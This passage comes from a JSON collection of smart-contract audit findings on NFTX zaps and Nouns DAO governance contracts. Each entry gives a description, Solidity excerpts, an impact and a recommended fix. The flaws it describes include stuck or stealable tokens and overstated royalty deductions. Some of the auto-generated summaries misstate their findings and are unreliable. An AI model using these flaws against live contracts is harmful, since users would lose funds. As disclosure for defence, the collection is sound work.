amounts,\n        idsOut,\n        msg.sender,\n        to,\n        vTokenPremiumLimit,\n        true\n    );\n}\n```\n\n```solidity\nMarketplaceUniversalRouterZap.sol L521-L535\nfunction _mint1155(\n    uint256 vaultId,\n    uint256[] calldata ids,\n    uint256[] calldata amounts\n) internal returns (address vault, address assetAddress) {\n    vault = nftxVaultFactory.vault(vaultId);\n    + if (!INFTXVaultV3(vault).is1155()) revert WrongVaultType();\n    assetAddress = INFTXVaultV3(vault).assetAddress();\n    IERC1155(assetAddress).safeBatchTransferFrom(\n        msg.sender,\n        address(this),\n        ids,\n        amounts,\n        \"\"\n    );\n}\n```",
      "summary": "\nThis bug report is about a vulnerability in the code of a smart contract called MarketplaceUniversalRouterZap.sol. The contract has two functions, swap1155 and _mint1155, that both use the ERC-1155 standard for handling tokens. However, the contract also allows for the use of a different standard, ERC-721, and this can cause problems. If a user makes a mistake when using the contract and sends both ERC-1155 and ERC-721 tokens, the ERC-721 tokens can get stuck in the contract and become unusable. This is a medium severity issue, and the recommendation is to add code to check for the token type and prevent this from happening.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54558",
      "title": "MigratorZap 's v2InventoryToXNFT() allows for NFT stealing as a result of operational mis- take ",
      "impact": "MEDIUM",
      "content": "## Vulnerability Report\n\n## Context\n`MigratorZap.sol#L188-L214`\n\n## Description\nThe function `v2InventoryToXNFT()` allows a user to specify both the v2 Vault address and its id. If `vTokenV2` and `nftxVaultFactory.vault(vaultId)` mismatch, the result of `v2Inventory.withdraw(vaultIdV2, shares)` can be stuck on the contract balance (i.e., the whole execution doesn't necessarily revert in this case as there are no direct zero checks), and can be immediately stolen by the back-running `v2InventoryToXNFT()` call with `vTokenV2 = nftxVaultFactory.vault(vaultId)`:\n\n```solidity\nMigratorZap.sol#L188-L201\nfunction v2InventoryToXNFT(\n    uint256 vaultIdV2,\n    address vTokenV2,\n    ...\n) external returns (uint256 xNFTId) {\n    address xToken = v2Inventory.vaultXToken(vaultIdV2);\n    IERC20(xToken).transferFrom(msg.sender, address(this), shares);\n    v2Inventory.withdraw(vaultIdV2, shares);\n    uint256 vTokenV2Balance = IERC20(vTokenV2).balanceOf(address(this));\n}\n```\n\n## Impact\nUsers mis-specifying the token address and Vault id will have their tokens stolen. Given the low likelihood of occurrence and the high potential loss of principal funds, the severity of this issue is set to medium.\n\n## Recommendation\nConsider either:\n\n1. Controlling for `vTokenV2 == nftxVaultFactory.vault(vaultId)` \n\nor \n\n2. Calculating the `vTokenV2` balance difference before and after `v2Inventory.withdraw(vaultIdV2, shares)` and requiring it to be positive.",
      "summary": "\nThe report discusses a vulnerability in the function `v2InventoryToXNFT()` in the `MigratorZap.sol` contract. This function allows users to specify a v2 Vault address and its id. However, if the `vTokenV2` and `nftxVaultFactory.vault(vaultId)` do not match, the result of `v2Inventory.withdraw(vaultIdV2, shares)` can be stuck on the contract balance and can be stolen by another call. This can result in users losing their tokens. The severity of this issue is considered medium and the report recommends controlling for the mismatch or calculating the balance difference before and after the `v2Inventory.withdraw()` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54557",
      "title": "When creating the vault, the forceTimelock parameter of inventoryStaking.deposit should be false. ",
      "impact": "HIGH",
      "content": "## Context\n**File:** CreateVaultZap.sol  \n**Lines:** 212-229  \n\n## Description\nWhen creating the Vault, the user can provide NFTs to add liquidity to the Pool or deposit to `inventoryStaking`. The problem here is that adding liquidity does not require timelock, while depositing to `inventoryStaking` forces timelock.\n\n```solidity\nnftxRouter.addLiquidity{value: msg.value}(\n  INFTXRouter.AddLiquidityParams({\n    vaultId: vaultId,\n    vTokensAmount: vTokensBalance,\n    nftIds: emptyIds,\n    nftAmounts: emptyIds,\n    tickLower: tickLower,\n    tickUpper: tickUpper,\n    fee: params.liquidityParams.fee,\n    sqrtPriceX96: currentSqrtPriceX96,\n    vTokenMin: params.liquidityParams.vTokenMin,\n    wethMin: params.liquidityParams.wethMin,\n    deadline: params.liquidityParams.deadline,\n    forceTimelock: false\n  })\n);\n```\n\n...\n\n```solidity\ninventoryStaking.deposit(\n  vaultId,\n  vTokensBalance,\n  msg.sender,\n  \"\",\n  false,\n  true // forceTimelock as we minted the vTokens with NFTs\n);\n```\n\nSince the first mint of the Vault doesn't charge `mintFee` (because there is no corresponding pool and `getTwapX96` returns 0), the initial add liquidity or deposit to `inventoryStaking` does not require timelock to neutralize `mintFee`. \n\nIf the user creates the Vault via `Factory.createVault` and then mints `VToken`, `mintFee` will not be charged, and later deposits to `inventoryStaking` also do not need to be locked. This would cause the user to have to lock for some time when depositing to `inventoryStaking`, which is considered high risk due to the high likelihood and medium impact.\n\n## Recommendation\nChange to:\n\n```solidity\nif (vTokensBalance > 0) {\n  // if dust above the min allowed value\n  if (vTokensBalance > MINIMUM_INVENTORY_LIQUIDITY) {\n    TransferLib.unSafeMaxApprove(\n      address(vault),\n      address(inventoryStaking),\n      vTokensBalance\n    );\n    inventoryStaking.deposit(\n      vaultId,\n      vTokensBalance,\n      msg.sender,\n      \"\",\n      false,\n      - true // forceTimelock as we minted the vTokens with NFTs\n      + false\n    );\n  }\n}\n```",
      "summary": "\nThe bug report discusses an issue with a specific file and lines of code in a program called CreateVaultZap.sol. The problem is that when a user creates a Vault, they can add NFTs to a pool or deposit them in a section called `inventoryStaking`. The issue is that adding NFTs does not require a timelock, but depositing them in `inventoryStaking` does. This creates a risk for users as they may have to wait for a certain amount of time before they can access their deposited NFTs. The recommendation is to change the code to include a check for the amount of NFTs being deposited and only force a timelock if the amount is above a certain threshold. This will reduce the risk for users and make the program more user-friendly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54556",
      "title": "NFT sale price is calculated as WETH spent on vTokens purchase and is overstated this way in royalty deductions ",
      "impact": "HIGH",
      "content": "## Context\n- `MarketplaceUniversalRouterZap.sol#L228-L250`\n- `MarketplaceUniversalRouterZap.sol#L465-L502`\n\n## Description\nThe `wethSpent` is the amount spent on vTokens, not all of which are used for NFT purchases. In fact, the amount of vTokens left is uncapped and can be arbitrarily large. This leads to overstated royalty amounts, as the actual sale price is lower than `wethSpent / tokenCount`, which is used in the `_deductRoyalty()` and `_deductRoyalty1155()` functions.\n\n## MarketplaceUniversalRouterZap.sol#L228-L250\n```solidity\n// swap WETH to vTokens\nuint256 iniWETHBal = WETH.balanceOf(address(this));\naddress vault = nftxVaultFactory.vault(vaultId);\n_swapTokens(address(WETH), vault, executeCallData);\nuint256 wethSpent = iniWETHBal - WETH.balanceOf(address(this));\nuint256 wethLeft = msg.value - wethSpent;\n// redeem NFTs. Forcing to deduct vault fees\nTransferLib.unSafeMaxApprove(address(WETH), vault, wethLeft);\nuint256 wethFees = INFTXVaultV3(vault).redeem(\n    idsOut,\n    to,\n    wethLeft,\n    vTokenPremiumLimit,\n    true\n);\nuint256 netRoyaltyAmount;\nif (deductRoyalty) {\n    address assetAddress = INFTXVaultV3(vault).assetAddress();\n    netRoyaltyAmount = _deductRoyalty(assetAddress, idsOut, wethSpent);\n}\n```\n\n## MarketplaceUniversalRouterZap.sol#L465-L502\n```solidity\n// swap some WETH to vTokens\nuint256 iniWETHBal = WETH.balanceOf(address(this));\naddress vault = nftxVaultFactory.vault(params.vaultId);\n_swapTokens(address(WETH), vault, params.executeToVTokenCallData);\nuint256 wethLeft = WETH.balanceOf(address(this));\nuint256 wethSpent = iniWETHBal - wethLeft;\n// redeem NFTs\nTransferLib.unSafeMaxApprove(address(WETH), vault, wethLeft);\nuint256 wethFees = INFTXVaultV3(vault).redeem(\n    params.idsOut,\n    params.to,\n    wethLeft,\n    params.vTokenPremiumLimit,\n    true\n);\nuint256 netRoyaltyAmount;\nif (params.deductRoyalty) {\n    address assetAddress = INFTXVaultV3(vault).assetAddress();\n    netRoyaltyAmount = _deductRoyalty(\n        assetAddress,\n        params.idsOut,\n        wethSpent\n    );\n}\n// transfer vToken dust and remaining WETH balance\n_transferDust(vault, true);\nemit Buy(\n    params.idsOut,\n    wethSpent + wethFees + netRoyaltyAmount,\n    params.to,\n    netRoyaltyAmount\n);\n```\n\n## Impact\nThe `netRoyaltyAmount` is overstated, causing users to systematically lose the extra deducted funds. Given the high likelihood and medium impact, the severity is considered high.\n\n## Recommendation\nConsider calculating the exact price of the tokens purchased, for example:\n\n```solidity\nuint256 constant BASE = 10 ** 18;\n\n// swap WETH to vTokens\nuint256 iniWETHBal = WETH.balanceOf(address(this));\naddress vault = nftxVaultFactory.vault(vaultId);\n(uint256 vTokenAmount, ) = _swapTokens(address(WETH), vault, executeCallData);\nif (vTokenAmount < idsOut.length * BASE) revert NotEnoughFundsForRedeem();\nuint256 wethSpent = iniWETHBal - WETH.balanceOf(address(this));\nuint256 wethLeft = msg.value - wethSpent;\n// redeem NFTs. Forcing to deduct vault fees\nTransferLib.unSafeMaxApprove(address(WETH), vault, wethLeft);\nuint256 wethFees = INFTXVaultV3(vault).redeem(\n    idsOut,\n    to,\n    wethLeft,\n    vTokenPremiumLimit,\n    true\n);\n// the (1 - idsOut.length * BASE / vTokenAmount) share of wethSpent is not spend,\n// but swapped to vTokens and returned to the caller via _transferDust() below\nwethSpent = (wethSpent * idsOut.length * BASE) / vTokenAmount;\nuint256 netRoyaltyAmount;\nif (deductRoyalty) {\n    address assetAddress = INFTXVaultV3(vault).assetAddress();\n    netRoyaltyAmount = _deductRoyalty(assetAddress, idsOut, wethSpent);\n}\n// transfer vToken dust and remaining WETH balance\n_transferDust(vault, true);\nemit Buy(\n    idsOut,\n    wethSpent + wethFees + netRoyaltyAmount,\n    to,\n    netRoyaltyAmount\n);\n```",
      "summary": "\nIn this bug report, the user has reported that there is a problem with the `wethSpent` variable in the `MarketplaceUniversalRouterZap.sol` file. This variable is used to calculate the amount spent on vTokens, but it is not taking into account all of the vTokens that are used for NFT purchases. This leads to an overstatement of the royalty amounts, as the actual sale price is lower than what is being calculated. This bug can have a high impact on users, as they may be losing extra funds due to this overstatement. The recommendation is to calculate the exact price of the tokens purchased to ensure that the `wethSpent` variable is accurate. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54555",
      "title": "TransferLib.transferFromERC721 doesn 't support CryptoKitties, so a range of protocol oper- ations are unavailable for them ",
      "impact": "HIGH",
      "content": "## TransferLib.transferFromERC721 Analysis\n\n## Context\n- **File:** TransferLib.sol\n- **Lines:** 81-102\n\n## Usages\n- **NFTXInventoryStakingV3Upgradeable:** Lines 201\n- **NFTXRouter:** Lines 361, 751\n- **CreateVaultZap:** Line 131\n- **MarketplaceUniversalRouterZap:** Line 566\n\n## Description\n`TransferLib.transferFromERC721` will fail for **CRYPTO_KITTIES**, which code doesn't have `safeTransferFrom()`, i.e., `TransferLib` doesn't support them (while `NFTXVaultUpgradeableV3` does):\n- **File:** TransferLib.sol\n- **Lines:** 74-106\n\n### Function Implementation\n```solidity\nfunction _transferFromERC721(\n    address assetAddr,\n    uint256 tokenId,\n    address to\n) private {\n    bytes memory data;\n    if (assetAddr != CRYPTO_PUNKS) {\n        // We push to the vault to avoid an unneeded transfer.\n        data = abi.encodeWithSignature(\n            \"safeTransferFrom(address,address,uint256)\",\n            msg.sender,\n            to,\n            tokenId\n        );\n    } else {\n        // Fix here for frontrun attack.\n        bytes memory punkIndexToAddress = abi.encodeWithSignature(\n            \"punkIndexToAddress(uint256)\",\n            tokenId\n        );\n        (bool checkSuccess, bytes memory result) = CRYPTO_PUNKS.staticcall(\n            punkIndexToAddress\n        );\n        address nftOwner = abi.decode(result, (address));\n        if (!checkSuccess || nftOwner != msg.sender) revert NotNFTOwner();\n        data = abi.encodeWithSignature(\"buyPunk(uint256)\", tokenId);\n    }\n    (bool success, bytes memory resultData) = address(assetAddr).call(data);\n    require(success, string(resultData));\n}\n```\nThis way, all the operations that use the function will be unavailable for **CRYPTO_KITTIES**, which are supported by the protocol.\n\n## Impact\n- NFTXInventoryStakingV3Upgradeable's deposit\n- NFTXRouter's selling NFTs and increasing/adding liquidity with NFTs\n- CreateVaultZap's Vault creation\n- MarketplaceUniversalRouterZap's swapping and selling\n\nAll of these operations are unavailable for **CryptoKitties**. \n\nGiven the high likelihood of this issue and the medium impact, the severity is set to high.\n\n## Recommendation\nConsider expanding `TransferLib.transferFromERC721` to include support for **CRYPTO_KITTIES**, similarly to `NFTXVaultUpgradeableV3`'s `_transferFromERC721`:\n- **File:** NFTXVaultUpgradeableV3.sol\n- **Lines:** 997-1005\n```solidity\n} else {\n    // CRYPTO_KITTIES\n    data = abi.encodeWithSignature(\n        \"transferFrom(address,address,uint256)\",\n        msg.sender,\n        address(this),\n        tokenId\n    );\n}\n```",
      "summary": "\nThe TransferLib.transferFromERC721 function is not working properly for CRYPTO_KITTIES, as it does not support the safeTransferFrom() function. This means that operations such as depositing in NFTXInventoryStakingV3Upgradeable, selling NFTs in NFTXRouter, creating vaults in CreateVaultZap, and swapping/selling in MarketplaceUniversalRouterZap are currently unavailable for CRYPTO_KITTIES. The severity of this issue is considered high and it is recommended to expand the function to include support for CRYPTO_KITTIES.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54554",
      "title": "_deductRoyalty1155 will leave part of the royalties in the contract and it can be taken out by other users ",
      "impact": "HIGH",
      "content": "## Context\n- MarketplaceUniversalRouterZap.sol#L672-L676\n- MarketplaceUniversalRouterZap.sol#L358-L370\n\n## Description\n`_deductRoyalty1155` collects royalties from ERC1155, but in the code below, the royalties are calculated as `royaltyAmount * amount`. However, only the `royaltyAmount` will be sent to the royalty owner, and the rest of the royalties of `royaltyAmount * amount - 1` will be left in the contract.\n\n```solidity\nnetRoyaltyAmount += royaltyAmount * amounts[i];\nif (royaltyAmount > 0) {\n    WETH.transfer(receiver, royaltyAmount);\n}\n...\nif (deductRoyalty) {\n    netRoyaltyAmount = _deductRoyalty1155(\n        assetAddress,\n        idsIn,\n        amounts,\n        wethAmount\n    );\n}\nwethAmount -= (wethFees + netRoyaltyAmount); // if underflow, then revert desired\n\n// convert WETH to ETH and send remaining ETH to `to`\n_wethToETHResidue(to, wethAmount);\n```\n\nOther users can call the `buyNFTsWithETH`, in `_allWethToETHResidue` all WETH in the contract will be sent to the user.\n\n```solidity\nfunction _allWethToETHResidue(\n    address to\n) internal returns (uint256 wethAmount) {\n    wethAmount = WETH.balanceOf(address(this));\n    _wethToETHResidue(to, wethAmount);\n}\n```\n\n## Recommendation\nChange to:\n\n```solidity\nfunction _deductRoyalty1155(\n    address nft,\n    uint256[] calldata idsIn,\n    uint256[] calldata amounts,\n    uint256 netWethAmount\n) internal returns (uint256 netRoyaltyAmount) {\n    bool success = IERC2981(nft).supportsInterface(_INTERFACE_ID_ERC2981);\n    if (success) {\n        uint256 salePrice = netWethAmount / idsIn.length;\n        for (uint256 i; i < idsIn.length; ) {\n            (address receiver, uint256 royaltyAmount) = IERC2981(nft)\n            .royaltyInfo(idsIn[i], salePrice);\n            netRoyaltyAmount += royaltyAmount * amounts[i];\n            if (royaltyAmount > 0) {\n                WETH.transfer(receiver, royaltyAmount * amounts[i]);\n            }\n        }\n    }\n}\n```",
      "summary": "\nThis bug report is about a code in MarketplaceUniversalRouterZap.sol that calculates royalties for ERC1155 tokens. The code currently calculates royalties as `royaltyAmount * amount`, but only `royaltyAmount` is sent to the owner while the rest stays in the contract. This can lead to an incorrect calculation of the remaining royalties. The recommendation is to change the code to a new function that properly calculates and sends the full amount of royalties to the owner. The bug can also cause all WETH in the contract to be sent to a user if they call the `buyNFTsWithETH` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54553",
      "title": "ERC-1155 sale price is calculated from ids array length only in _deductRoyalty1155() and can be signiﬁcantly overstated ",
      "impact": "HIGH",
      "content": "## Context\n- **File:** MarketplaceUniversalRouterZap.sol#L667\n- **Description:** Since amounts can differ, the length based salePrice can be overstated:\n  - **Relevant Lines:** MarketplaceUniversalRouterZap.sol#L659-L671\n\n## Function Overview\n```solidity\nfunction _deductRoyalty1155(\n...\n) internal returns (uint256 netRoyaltyAmount) {\n    bool success = IERC2981(nft).supportsInterface(_INTERFACE_ID_ERC2981);\n    if (success) {\n        uint256 salePrice = netWethAmount / idsIn.length;\n        for (uint256 i; i < idsIn.length; ) {\n            (address receiver, uint256 royaltyAmount) = IERC2981(nft)\n                .royaltyInfo(idsIn[i], salePrice);\n            // Total NFT number needs to be used here instead.\n        }\n    }\n}\n```\n\n## Impact\nThe `salePrice` is overstated, causing users to systematically lose the extra deducted funds. This loss can be substantial, especially when amounts can be arbitrarily large, leading to the price being overstated by magnitudes. For instance, an amount of 50 would mean that 50 times the price is used for royalty deduction.\n\nGiven the high likelihood of this issue and its significant impact, the severity is categorized as critical.\n\n## Recommendation\nConsider using the total NFT amount instead of the array length, as demonstrated in the `MarketplaceUniversalRouterZap`'s `_validate1155Ids()` function:\n```solidity\nfunction _validate1155Ids(\n    uint256[] calldata ids,\n    uint256[] calldata amounts\n) internal pure returns (uint256 totalAmount) {\n    // Sum the amounts for our emitted events\n    for (uint i; i < ids.length; ) {\n        unchecked {\n            // simultaneously verifies that lengths of `ids` and `amounts` match.\n            totalAmount += amounts[i];\n            ++i;\n        }\n    }\n}\n```\n\n### Suggested Code Change\n```solidity\nfunction _deductRoyalty1155(\n...\n) internal returns (uint256 netRoyaltyAmount) {\n    bool success = IERC2981(nft).supportsInterface(_INTERFACE_ID_ERC2981);\n    if (success) {\n        // Change made here\n        // - uint256 salePrice = netWethAmount / idsIn.length;\n        // + uint256 salePrice = netWethAmount / _validate1155Ids(idsIn, amounts);\n        for (uint256 i; i < idsIn.length; ) {\n            (address receiver, uint256 royaltyAmount) = IERC2981(nft)\n                .royaltyInfo(idsIn[i], salePrice);\n        }\n    }\n}\n```",
      "summary": "\nThis report is about a bug in a code file called MarketplaceUniversalRouterZap.sol. The bug causes the sale price to be overstated, which means users are losing more money than they should. This can be a big problem, especially when dealing with large amounts of money. The report recommends changing the code to use a different method for calculating the sale price, which should fix the bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54552",
      "title": "MigratorZap 's _v2ToV3Vault() pushes the ERC-1155 tokens directly to the v3 Vault, breaking up its mint, which renders MigratorZap unavailable for ERC-1155 underlyings ",
      "impact": "HIGH",
      "content": "## Context\nMigratorZap.sol#L348-L353\n\n## Description\nThe `_v2ToV3Vault()` function redeems directly to the v3 Vault all the time. However, this approach works only for ERC-721 tokens. In the case of ERC-1155 tokens, the subsequent Vault's `mint()` function will attempt to pull the tokens in from `MigratorZap` and revert, as these token IDs have already been sent to `NFTXVaultUpgradeableV3`:\n\n```solidity\nfunction _receiveNFTs(\n    address depositor,\n    uint256[] calldata tokenIds,\n    uint256[] calldata amounts\n) internal returns (uint256) {\n    if (!allValidNFTs(tokenIds)) revert NotEligible();\n    \n    if (!is1155) {\n        address _assetAddress = assetAddress;\n        uint256 len = tokenIds.length;\n        for (uint256 i; i < len; ) {\n            uint256 tokenId = tokenIds[i];\n            \n            // We may already own the NFT here so we check in order:\n            // Does the vault own it?\n            // - If so, check if it's in holdings list\n            // - If so, we reject. This means the NFT has already been claimed for.\n            // - If not, it means we have not yet accounted for this NFT, so we continue.\n            // - If not, we \"pull\" it from the msg.sender and add to holdings.\n            _transferFromERC721(_assetAddress, tokenId);\n            if (!_holdings.add(tokenId)) revert HoldingsUpdationFailed();\n            tokenDepositInfo[tokenId] = TokenDepositInfo({\n                timestamp: uint48(block.timestamp),\n                depositor: depositor\n            });\n            unchecked {\n                ++i;\n            }\n        }\n        return len;\n    } else {\n        // This is technically a check, so placing it before the effect.\n        IERC1155Upgradeable(assetAddress).safeBatchTransferFrom(\n            msg.sender,\n            address(this),\n            tokenIds,\n            amounts,\n            \"\"\n        );\n    }\n}\n```\n\n`INFTXVaultV3(vTokenV3).mint()` will deterministically fail, causing upstream calls such as `sushi-ToNFTXAMM()`, `v2InventoryToXNFT()`, and `v2VaultToXNFT()` to revert. This affects all user-facing functions in `MigratorZap`.\n\n## Impact\nAs a result, `MigratorZap` is fully unavailable for any ERC-1155 underlyings. Given the high likelihood and significant impact, the severity is set to critical.\n\n## Recommendation\nConsider introducing handling for ERC-1155 cases, such as:\n\n```solidity\n// redeem v2 vTokens. Directly transferring to the v3 vault\nuint256[] memory idsRedeemed = INFTXVaultV2(vTokenV2).redeemTo(\n    vTokenV2Balance / 1 ether,\n    idsToRedeem,\n    is1155 ? address(this) : vTokenV3\n);\n\nif (is1155) {\n    IERC1155(INFTXVaultV3(vTokenV3).assetAddress()).setApprovalForAll(\n        vTokenV3,\n        true\n    );\n}\n```",
      "summary": "\nThe MigratorZap.sol file has a function called `_v2ToV3Vault()` that is supposed to redeem ERC-721 tokens to the v3 Vault. However, this function does not work for ERC-1155 tokens, causing errors when trying to use it. This means that the MigratorZap is not available for ERC-1155 tokens. The severity of this issue is critical and it is recommended to add handling for ERC-1155 cases in the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "21361",
      "title": "A malicious DAO can increase the odds of proposal defeat by setting a very high value of lastMinuteWindowInBlocks",
      "impact": "LOW",
      "content": "## Severity Report\n\n## Severity\n**Low Risk**\n\n## Context\n- `NounsDAOV3Admin.sol#L219-L227`\n- `NounsDAOV3Votes.sol#L229-L257`\n\n## Description\nThe goal of the objection-only period, as documented, is to protect the DAO from executing proposals that the majority would not want to execute. However, a malicious majority can abuse this feature by setting a very high value for `lastMinuteWindowInBlocks` (the setter does not enforce a maximum threshold), such as a value very close to the voting period, to increase the probability of triggering the objection-only period.\n\n### Example Scenario\nIf `votingPeriod = 2 weeks` and a governance proposal somehow passed to set `lastMinuteWindowInBlocks` to a value very close to `100800` blocks (i.e., ~2 weeks), then every proposal may end up with an objection-only period.\n\n## Impact\nEvery proposal may end up with an objection-only period, which may not be required or expected. The combination of low likelihood and low impact results in low severity.\n\n## Recommendation\nConsider implementing a maximum threshold for `lastMinuteWindowInBlocks`, preferably as a percentage value (e.g., 70%) of the `votingPeriod`, which would make any triggering of the objection period meaningful. This is important because switching the proposal state from defeated to successful during the initial phase of the voting period may not convey significant information.\n\n## Nouns\nThe perspective is that it is still seen as a feature to be able to set it to the entire voting period. **Won't fix.**\n\n## Spearbit\nOur take here is that during the initial part of the voting period, this trigger is more of a bug than a feature. Switching from \"Defeated\" to \"Successful\" brings in no information when voting has just started. **Acknowledged.**",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21360",
      "title": "Due to misaligned DAO and Executors logic any proposal will be blocked from execution at 'eta + GRACE_PERIOD' timestamp",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- NounsDAOLogicV2.sol#L455-L473\n- NounsDAOV3Proposals.sol#L625-L652\n- NounsDAOLogicV1Fork.sol#L477-L493\n\n## Description\nThere is an inconsistency in treatment of the `eta + GRACE_PERIOD` moment of time in the proposal lifecycle: any proposal is executable in timelock at this timestamp but has expired status in the DAO logic.\n\nBoth Executors allow the executions when `block.timestamp == eta + GRACE_PERIOD`:\n\n### TheNounsDAOExecutor:executeTransaction() function:\n```solidity\nfunction executeTransaction(\n    address target,\n    uint256 value,\n    string memory signature,\n    bytes memory data,\n    uint256 eta\n) public returns (bytes memory) {\n    ...\n    require(\n        getBlockTimestamp() >= eta,\n        \"NounsDAOExecutor::executeTransaction: Transaction hasn't surpassed time lock.\"\n    );\n    require(\n        getBlockTimestamp() <= eta + GRACE_PERIOD,\n        \"NounsDAOExecutor::executeTransaction: Transaction is stale.\"\n    );\n}\n```\n\n### TheNounsDAOExecutorV2:executeTransaction() function:\n```solidity\nfunction executeTransaction(\n    address target,\n    uint256 value,\n    string memory signature,\n    bytes memory data,\n    uint256 eta\n) public returns (bytes memory) {\n    ...\n    require(\n        getBlockTimestamp() >= eta,\n        \"NounsDAOExecutor::executeTransaction: Transaction hasn't surpassed time lock.\"\n    );\n    require(\n        getBlockTimestamp() <= eta + GRACE_PERIOD,\n        \"NounsDAOExecutor::executeTransaction: Transaction is stale.\"\n    );\n}\n```\n\nWhile all (V1, V2, V3, and V1Fork) DAO state functions produce the expired state.\n\n### TheNounsDAOLogicV2:state() function:\n```solidity\nfunction state(uint256 proposalId) public view returns (ProposalState) {\n    require(proposalCount >= proposalId, \"NounsDAO::state: invalid proposal id\");\n    Proposal storage proposal = _proposals[proposalId];\n    \n    if (proposal.vetoed) {\n        return ProposalState.Vetoed;\n    } else if (proposal.canceled) {\n        return ProposalState.Canceled;\n    } else if (block.number <= proposal.startBlock) {\n        return ProposalState.Pending;\n    } else if (block.number <= proposal.endBlock) {\n        return ProposalState.Active;\n    } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < quorumVotes(proposal.id)) {\n        return ProposalState.Defeated;\n    } else if (proposal.eta == 0) {\n        return ProposalState.Succeeded;\n    } else if (proposal.executed) {\n        return ProposalState.Executed;\n    } else if (block.timestamp >= proposal.eta + timelock.GRACE_PERIOD()) {\n        return ProposalState.Expired;\n    }\n}\n```\n\n### TheNounsDAOV3Proposals:stateInternal() function:\n```solidity\nfunction stateInternal(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId)\n    internal\n    view\n    returns (NounsDAOStorageV3.ProposalState)\n{\n    require(ds.proposalCount >= proposalId, \"NounsDAO::state: invalid proposal id\");\n    NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n    \n    if (proposal.vetoed) {\n        return NounsDAOStorageV3.ProposalState.Vetoed;\n    } else if (proposal.canceled) {\n        return NounsDAOStorageV3.ProposalState.Canceled;\n    } else if (block.number <= proposal.updatePeriodEndBlock) {\n        return NounsDAOStorageV3.ProposalState.Updatable;\n    } else if (block.number <= proposal.startBlock) {\n        return NounsDAOStorageV3.ProposalState.Pending;\n    } else if (block.number <= proposal.endBlock) {\n        return NounsDAOStorageV3.ProposalState.Active;\n    } else if (block.number <= proposal.objectionPeriodEndBlock) {\n        return NounsDAOStorageV3.ProposalState.ObjectionPeriod;\n    } else if (isDefeated(ds, proposal)) {\n        return NounsDAOStorageV3.ProposalState.Defeated;\n    } else if (proposal.eta == 0) {\n        return NounsDAOStorageV3.ProposalState.Succeeded;\n    } else if (proposal.executed) {\n        return NounsDAOStorageV3.ProposalState.Executed;\n    } else if (block.timestamp >= proposal.eta + getProposalTimelock(ds, proposal).GRACE_PERIOD()) {\n        return NounsDAOStorageV3.ProposalState.Expired;\n    }\n}\n```\n\n### TheNounsDAOLogicV1Fork:state() function:\n```solidity\nfunction state(uint256 proposalId) public view returns (ProposalState) {\n    require(proposalCount >= proposalId, \"NounsDAO::state: invalid proposal id\");\n    Proposal storage proposal = _proposals[proposalId];\n    \n    if (proposal.canceled) {\n        return ProposalState.Canceled;\n    } else if (block.number <= proposal.startBlock) {\n        return ProposalState.Pending;\n    } else if (block.number <= proposal.endBlock) {\n        return ProposalState.Active;\n    } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {\n        return ProposalState.Defeated;\n    } else if (proposal.eta == 0) {\n        return ProposalState.Succeeded;\n    } else if (proposal.executed) {\n        return ProposalState.Executed;\n    } else if (block.timestamp >= proposal.eta + timelock.GRACE_PERIOD()) {\n        return ProposalState.Expired;\n    }\n}\n```\n\n## Impact\nSince both timelocks require the sender to be an admin, the valid proposal will be blocked from execution and forced to be expired when execution call time happens to be `proposal.eta + getProposalTimelock(ds, proposal).GRACE_PERIOD()`. \n\nThe probability of this exact timestamp being reached is low, while the impact of a successful proposal being rendered 